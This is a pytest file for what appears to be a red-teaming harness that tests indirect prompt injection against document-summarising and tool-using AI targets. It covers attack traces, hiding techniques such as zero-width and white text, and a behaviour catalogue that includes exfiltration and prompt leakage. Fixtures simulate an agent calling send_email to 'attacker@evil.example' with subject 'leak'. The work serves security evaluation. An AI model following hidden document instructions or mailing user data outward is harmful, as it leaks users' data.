"""Tests for advtest_ext.core.models — round-trip serialisation,
seed-catalogue load + citation resolution, replay-bundle on-disk
round-trip."""

from __future__ import annotations

import re
from datetime import UTC, datetime
from pathlib import Path

import pytest

from advtest_ext.core import (
    AsrBreakdownRow,
    AttackTrace,
    Behavior,
    Budget,
    HidingTechnique,
    JudgeScore,
    Payload,
    ReplayBundle,
    RunConfig,
    RunResult,
    SummaryStats,
    load_seed_behaviors,
)
from advtest_ext.document import (
    AbstractDocument,
    HiddenContent,
    TextBlock,
)

REPO_ROOT = Path(__file__).resolve().parents[1]
BIB_PATH = REPO_ROOT / "references.bib"
_BIBKEY_RE = re.compile(r"^@\w+\s*\{\s*([^,\s]+)\s*,", re.MULTILINE)


def _bib_keys() -> set[str]:
    return set(_BIBKEY_RE.findall(BIB_PATH.read_text()))


# ----------------------------------------------------------------------
# Round-trip serialisation
# ----------------------------------------------------------------------


def _full_behavior() -> Behavior:
    return Behavior(
        id="b1",
        description="d",
        severity="critical",
        success_criteria="sc",
        source_citation="greshake2023ipi",
        category="instruction_override",
    )


def _full_payload() -> Payload:
    return Payload(
        id="p1",
        text="payload text",
        modality="text",
        generator_name="pair_attacker_v0",
        parent_payload_id="p0",
        source_citation="chao2023pair",
    )


def _full_technique() -> HidingTechnique:
    return HidingTechnique(
        id="zwj",
        name="zero-width joiner",
        description="bury characters with U+200D",
        applies_to=["text", "heading", "comments"],
        references=["boucher2022badchars"],
        attack_class="zero_width",
        requires_capability=["formatting"],
    )


def _full_judge_score() -> JudgeScore:
    return JudgeScore(
        judge_name="harmbench",
        score=0.83,
        reasoning="model output produced exfil URL",
        flagged=True,
        judge_version="hb-cls-2024.1",
    )


def _full_trace() -> AttackTrace:
    return AttackTrace(
        id="t1",
        run_id="r1",
        timestamp=datetime(2026, 5, 9, 12, 0, tzinfo=UTC),
        behavior_id="b1",
        payload=_full_payload(),
        technique=_full_technique(),
        target_name="docs_gemini_stub",
        raw_request="<rendered doc>",
        raw_response="follow the hidden instruction",
        judge_scores=[_full_judge_score()],
        verdict="success",
        replay_bundle_path=Path("/tmp/replay/r1/t1"),
    )


def _full_run_config() -> RunConfig:
    return RunConfig(
        target_name="docs_gemini_stub",
        attacks=["pair", "msj"],
        behaviors=["b1", "b2"],
        budget=Budget(max_queries=100, max_seconds=600.0, max_cost_usd=5.0),
        judges=["harmbench", "strongreject"],
        output_dir=Path("/tmp/run"),
        max_concurrency=4,
    )


def _full_run_result() -> RunResult:
    return RunResult(
        run_id="r1",
        config=_full_run_config(),
        traces=[_full_trace()],
        summary_stats=SummaryStats(
            total_traces=1,
            successful_traces=1,
            overall_asr=1.0,
            asr_breakdown=[
                AsrBreakdownRow(
                    attack_name="pair",
                    technique_id="zwj",
                    behavior_id="b1",
                    successes=1,
                    attempts=1,
                    asr=1.0,
                ),
            ],
            judge_agreement_rates={"harmbench|strongreject": 1.0},
        ),
    )


@pytest.mark.parametrize(
    ("model", "instance"),
    [
        ("Behavior", _full_behavior()),
        ("Payload", _full_payload()),
        ("HidingTechnique", _full_technique()),
        ("JudgeScore", _full_judge_score()),
        ("AttackTrace", _full_trace()),
        ("RunConfig", _full_run_config()),
        ("RunResult", _full_run_result()),
        ("Budget", Budget(max_queries=10, max_seconds=60.0, max_cost_usd=0.5)),
        (
            "AsrBreakdownRow",
            AsrBreakdownRow(
                attack_name="bon",
                technique_id=None,
                behavior_id="b2",
                successes=3,
                attempts=10,
                asr=0.3,
            ),
        ),
    ],
)
def test_roundtrip_through_json(model: str, instance: object) -> None:
    cls = type(instance)
    payload = cls.model_dump_json(instance)  # type: ignore[attr-defined]
    restored = cls.model_validate_json(payload)  # type: ignore[attr-defined]
    assert restored == instance, f"{model} did not round-trip cleanly"


def test_judge_score_score_bounds() -> None:
    """Score is constrained to [0, 1]; out-of-range raises."""
    from pydantic import ValidationError

    with pytest.raises(ValidationError):
        JudgeScore(judge_name="x", score=1.2, reasoning="", flagged=False, judge_version="v")
    with pytest.raises(ValidationError):
        JudgeScore(judge_name="x", score=-0.1, reasoning="", flagged=False, judge_version="v")


def test_run_config_max_concurrency_must_be_positive() -> None:
    from pydantic import ValidationError

    with pytest.raises(ValidationError):
        RunConfig(target_name="t", output_dir=Path("/tmp"), max_concurrency=0)


def test_run_config_accepts_target_and_attack_options() -> None:
    """Pydantic schema accepts the new option dicts as
    ``dict[str, Any]`` / ``dict[str, dict[str, Any]]``. Defaults are
    empty dicts so existing configs without these fields still
    round-trip cleanly."""
    cfg = RunConfig(
        target_name="google_docs",
        target_options={"mode": "ui_mode", "ui_output_dir": "./out"},
        attacks=["pair_indirect"],
        attack_options={"pair_indirect": {"indirect_techniques": ["white_text"]}},
        output_dir=Path("/tmp/run"),
    )
    assert cfg.target_options == {"mode": "ui_mode", "ui_output_dir": "./out"}
    assert cfg.attack_options == {"pair_indirect": {"indirect_techniques": ["white_text"]}}
    # Backwards-compat: configs that omit the new fields default to
    # empty dicts (NOT None), so factory code can safely call
    # ``.get(name)`` without an extra guard.
    bare = RunConfig(target_name="stub", output_dir=Path("/tmp"))
    assert bare.target_options == {}
    assert bare.attack_options == {}


# ----------------------------------------------------------------------
# Seed catalogue
# ----------------------------------------------------------------------


def test_seed_catalogue_loads_at_least_fifteen() -> None:
    behaviors = load_seed_behaviors()
    assert len(behaviors) >= 15, f"expected ≥ 15 seed behaviours, got {len(behaviors)}"


def test_seed_catalogue_ids_are_unique() -> None:
    behaviors = load_seed_behaviors()
    ids = [b.id for b in behaviors]
    assert len(ids) == len(set(ids)), f"duplicate behaviour ids: {ids}"


def test_seed_catalogue_covers_every_category() -> None:
    """Every BehaviorCategory should appear at least once — pitch
    materials reference a balanced taxonomy, so missing categories
    should fail loud."""
    expected = {
        "exfiltration",
        "instruction_override",
        "output_manipulation",
        "unauthorized_action",
        "prompt_leakage",
    }
    seen = {b.category for b in load_seed_behaviors()}
    assert expected <= seen, f"missing categories: {expected - seen}"


def test_seed_citations_resolve() -> None:
    """Every Behavior.source_citation must be a real bibtex key in
    references.bib. Drift here breaks the Prompt-4 PDF builder."""
    bib_keys = _bib_keys()
    behaviors = load_seed_behaviors()
    missing = [(b.id, b.source_citation) for b in behaviors if b.source_citation not in bib_keys]
    assert not missing, f"behaviours with unresolved citations: {missing}"


def test_seed_catalogue_validates_strict() -> None:
    """``extra="forbid"`` ensures unknown YAML keys raise. This test
    catches a future maintainer adding e.g. ``severity_notes:`` to a
    YAML entry without updating the model."""
    behaviors = load_seed_behaviors()
    # Just touching every field forces validation; no schema drift means
    # the load above already succeeded.
    for b in behaviors:
        assert b.id and b.description and b.success_criteria


# ----------------------------------------------------------------------
# ReplayBundle round-trip
# ----------------------------------------------------------------------


def _bundle_for_test() -> ReplayBundle:
    doc = AbstractDocument(
        id="doc-1",
        title="Replay test",
        body_blocks=[
            TextBlock(
                text="Visible body",
                hidden=HiddenContent(
                    technique_id="zero_width",
                    payload_id="p-1",
                    references=["boucher2022badchars"],
                ),
            ),
        ],
    )
    return ReplayBundle(
        bundle_id="bundle-001",
        abstract_document=doc,
        rendered_native="<html>rendered</html>",
        prompt="Summarise this document.",
        response="(stub-response)",
        judge_scores=[_full_judge_score()],
        replay_script="#!/usr/bin/env python\nprint('replay')\n",
    )


def test_replay_bundle_writes_expected_files(tmp_path: Path) -> None:
    bundle = _bundle_for_test()
    out = bundle.write(tmp_path / "rb")

    assert out.is_dir()
    for name in (
        "manifest.json",
        "abstract_document.json",
        "rendered_native.txt",
        "prompt.txt",
        "response.txt",
        "judge_scores.json",
        "replay.py",
    ):
        assert (out / name).exists(), f"missing {name}"


def test_replay_bundle_round_trip(tmp_path: Path) -> None:
    bundle = _bundle_for_test()
    out = bundle.write(tmp_path / "rb")
    restored = ReplayBundle.read(out)
    assert restored == bundle


def test_attack_trace_raw_response_data_round_trips() -> None:
    """``raw_response_data`` carries the agent's CallLog (tool_calls,
    rounds, hidden_techniques) for tool-using targets. Locks the
    field's existence and the round-trip — F-001 reproduction
    requires these survive into the persisted trace."""
    trace = AttackTrace(
        id="t-rrd-1",
        run_id="r-1",
        behavior_id="unauthorized_email_send_to_external",
        payload=Payload(id="p", text="x", modality="text", generator_name="t"),
        target_name="tool_use_agent",
        raw_request="x",
        raw_response="The email has been sent to attacker@evil.example.",
        raw_response_data={
            "tool_calls": [
                {
                    "tool_name": "send_email",
                    "args": {"to": "attacker@evil.example", "subject": "leak"},
                    "result": "msg-abc123",
                }
            ],
            "rounds": 2,
            "hidden_techniques": ["white_text"],
        },
    )
    restored = AttackTrace.model_validate_json(trace.model_dump_json())
    assert restored == trace
    assert restored.raw_response_data["tool_calls"][0]["tool_name"] == "send_email"


def test_replay_bundle_persists_response_raw_to_disk(tmp_path: Path) -> None:
    """When the bundle carries non-empty ``response_raw``, the disk
    artefact must include ``response_raw.json`` (not just
    ``response.txt``). Read-back round-trips losslessly."""
    bundle = ReplayBundle(
        bundle_id="b-rr-1",
        abstract_document=AbstractDocument(id="d", title="t"),
        prompt="summarise this",
        response="The email has been sent...",
        response_raw={
            "tool_calls": [
                {
                    "tool_name": "send_email",
                    "args": {"to": "attacker@evil.example"},
                    "result": "msg-1",
                }
            ],
            "rounds": 1,
        },
    )
    out = bundle.write(tmp_path / "rb")
    assert (out / "response_raw.json").exists()
    restored = ReplayBundle.read(out)
    assert restored.response_raw == bundle.response_raw
    # The text and structured data live in distinct files (the user's
    # explicit request).
    assert (out / "response.txt").read_text() == "The email has been sent..."


def test_replay_bundle_omits_response_raw_when_empty(tmp_path: Path) -> None:
    """No ``response_raw.json`` written when there's no structured
    data — keeps replay bundles for chat-only targets minimal."""
    bundle = ReplayBundle(
        bundle_id="b-empty-rr",
        abstract_document=AbstractDocument(id="d", title="t"),
        prompt="x",
        response="y",
    )
    out = bundle.write(tmp_path / "rb")
    assert not (out / "response_raw.json").exists()
    restored = ReplayBundle.read(out)
    assert restored.response_raw == {}


def test_replay_bundle_round_trip_without_rendered(tmp_path: Path) -> None:
    """``rendered_native`` is optional — round-trip when it's absent."""
    base = _bundle_for_test()
    bundle = base.model_copy(update={"rendered_native": None})
    out = bundle.write(tmp_path / "rb_no_native")
    assert not (out / "rendered_native.txt").exists()
    restored = ReplayBundle.read(out)
    assert restored == bundle
    assert restored.rendered_native is None
